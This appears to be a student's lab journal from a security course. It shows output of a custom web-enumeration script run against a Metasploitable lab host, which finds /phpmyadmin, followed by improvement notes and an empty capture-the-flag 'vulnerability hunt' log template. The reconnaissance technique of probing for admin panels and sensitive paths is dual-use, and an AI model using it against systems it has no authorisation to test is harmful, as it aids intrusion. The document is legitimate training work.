└─$ python3 ./web_enum.py http://172.16.19.101
[HEADERS]
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: Not present
X-AspNet-Version: Not present
X-AspNetMvc-Version: Not present
X-Generator: Not present
Via: Not present
Final-URL: http://172.16.19.101/
Redirected: Yes

[COMMENTS]
Found 0 HTML comment(s):

[SENSITIVE PATHS]
/robots.txt      -> NOT FOUND (404)
/admin           -> NOT FOUND (404)
/phpmyadmin      -> FOUND (301)
/login           -> NOT FOUND (404)
/.git            -> NOT FOUND (404)
Questions or things to revisit:
•	Should /robots.txt be:
o	parsed automatically for hidden paths?
•	Expand sensitive paths:
o	/dvwa
o	/mutillidae
o	/uploads
•	Add lightweight fingerprinting:
o	Detect DVWA / Mutillidae from HTML
•	Improve detection:
o	flag outdated versions (Apache 2.2, PHP 5.2)
•	Add optional verbosity:
o	show full headers vs filtered

Metasploitable web recon output:
Server: Apache/2.4.7 (Ubuntu)


HTML comments found:
[COMMENTS]
Found 0 HTML comment(s):


Sensitive paths found:
[SENSITIVE PATHS]
/robots.txt      -> NOT FOUND (404)
/admin           -> NOT FOUND (404)
/phpmyadmin      -> FOUND (301)
/login           -> NOT FOUND (404)
/.git            -> NOT FOUND (404)


### [17/04/2026] — Session B
Mainly worked on improving the code written over the last 4 weeks.
worked on the mock test.
---

## Week 5 — Vulnerability Hunt

> This section is your mission log. Update it in real time during the session.
> Benji does not write the mission log after the mission. He writes it during.

### Pre-Hunt Checklist

- [ ] All four toolkit tools pass their field tests locally
- [ ] `requirements.txt` is up to date (`pip freeze > requirements.txt`)
- [ ] `AI_LOG.md` is current
- [ ] `vulnerability_hunt/exploit.py` — argument parsing in place
- [ ] `vulnerability_hunt/fix.py` — argument parsing in place
- [ ] `vulnerability_hunt/REPORT.md` — headings populated, ready to fill
- [ ] Git remote confirmed, can push
- [ ] Tags w1, w2, w3, w4 in place

### Hunt Log

**[TIME] — Diagnosis phase:**

**[TIME] — Vulnerability identified:**

**[TIME] — Exploit development:**

**[TIME] — Flag retrieved:**
```
FLAG:
```

**[TIME] — Remediation:**

**[TIME] — Final commit and push:**


